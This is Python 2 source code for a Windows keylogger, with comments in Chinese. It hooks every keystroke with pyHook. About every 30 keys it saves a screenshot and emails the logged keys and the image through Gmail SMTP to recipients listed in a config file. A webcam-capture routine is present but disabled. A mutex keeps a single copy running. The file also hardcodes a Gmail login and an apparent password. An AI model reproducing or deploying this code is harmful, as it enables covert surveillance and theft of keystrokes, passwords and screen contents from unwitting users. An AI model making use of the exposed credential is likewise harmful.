# -*- coding: utf-8 -*-
from email.mime.text import MIMEText
import pyHook
import smtplib
import pythoncom 
import ImageGrab 
from email.mime.multipart import MIMEMultipart
from win32event import CreateMutex
from win32api import CloseHandle, GetLastError
from winerror import ERROR_ALREADY_EXISTS
# from VideoCapture import Device
import ConfigParser 

#保证程序的单例运行 单例锁
class Singleinstance:

    def __init__(self):
        self.mutexname = "testmutex_{D0E858DF-985E-4907-B7FB-8D732C3FC3B9}"
        self.mutex = CreateMutex(None, False, self.mutexname)
        self.lasterror = GetLastError()

    def aleradyrunning(self):
        return (self.lasterror == ERROR_ALREADY_EXISTS)

    def __del__(self):
        if self.mutex:
            CloseHandle(self.mutex)

str = ''
mail_to = ''
heatNum = 0
boomNum =0
 
def onMouseEvent(event):
    # 监听鼠标事件
    print "MessageName:", event.MessageName
    print "Message:", event.Message
    print "Time:", event.Time
    print "Window:", event.Window
    print "WindowName:", event.WindowName
    print "Position:", event.Position
    print "Wheel:", event.Wheel
    print "Injected:", event.Injected
    print "---"
    # 返回 True 以便将事件传给其它处理程序
    # 注意，这儿如果返回 False ，则鼠标事件将被全部拦截
    # 也就是说你的鼠标看起来会僵在那儿，似乎失去响应了
    return True
 
def pushEmail(stri):
    msg = MIMEMultipart()
    #正文
    mail_body = stri
    #发信邮箱
    mail_from = 'tangqianfeng820@gmail.com'
    
    #添加邮件内容
    att1 = MIMEText(open('screen.png','rb').read(), 'base64', 'gb2312')
    att1["Content-Type"] = 'application/octet-stream'
    att1["Content-Disposition"] = 'attachment; filename="screen.png"'#这里的filename可以任意写，写什么名字，
    msg.attach(att1)
   
    att2 = MIMEText('键盘监听内容:'+mail_body)
    msg.attach(att2)
    
#     att3 = MIMEText(open('photo.png','rb').read(), 'base64', 'gb2312')
#     att3["Content-Type"] = 'application/octet-stream'
#     att3["Content-Disposition"] = 'attachment; filename="photo.png"'
#     msg.attach(att3)
    
    #定义标题
    msg['Subject'] = '峰兄的监控数据'
    #定义发信人
    msg['From'] = mail_from
    msg['To'] = ';'.join(mail_to)
 
    smtp = smtplib.SMTP()
    #连接SMTP服务器，此处用的126的SMTP服务器
    smtp.connect('smtp.gmail.com',587)
    #用户名密码
    smtp.starttls()
    smtp.login('tangqianfeng820@gmail.com','q67845287')
    smtp.sendmail(mail_from, mail_to, msg.as_string())
    print "email send over"
    smtp.quit()
 
def onKeyboardEvent(event):
    #获得窗口名字
    winName = event.WindowName.decode('GBK')
    print "winname:",winName
    # 监听键盘事件
    global str
    global heatNum
    str = str+" "+event.Key
    heatNum = heatNum +1
    print "len:",heatNum
    
    if heatNum > 30:
        stri = str
        str = ""
        heatNum = 0
        screenShots()
#         photoShots()
        pushEmail(stri)
    print "---"
 
    # 同鼠标事件监听函数的返回值
    return True
 
#定义附件 截屏附件
def screenShots():
    pic = ImageGrab.grab()
    pic.save('screen.png')
    
#定义附件 摄像头附件
def photoShots():
    cam = Device()
    cam.saveSnapshot('photo.png')
    
#读取配置文件
def configAllFromFile(config_name="config.ini"):
    config = ConfigParser.ConfigParser()
    config.read(config_name)
    global mail_to
    global heatNum
    mail_to = config.get("toEmail", "email").split(",")
    boomNum = int(config.get("toEmail", "heatNum"))
    
    
def main():
    # 创建一个“钩子”管理对象
    hm = pyHook.HookManager()
 
    # 监听所有键盘事件
    hm.KeyDown = onKeyboardEvent
    # 设置键盘“钩子”
    hm.HookKeyboard()
 
    # 监听所有鼠标事件
    # hm.MouseAll = onMouseEvent
    # 设置鼠标“钩子”
    #hm.HookMouse()
    # 进入循环，如不手动关闭，程序将一直处于监听状态
    pythoncom.PumpMessages(100000)
 
 
if __name__ == "__main__":
    myapp = Singleinstance()
    # 检查是否已经有实例在运行了
    if myapp.aleradyrunning():
        exit(0)
    configAllFromFile()
    main()
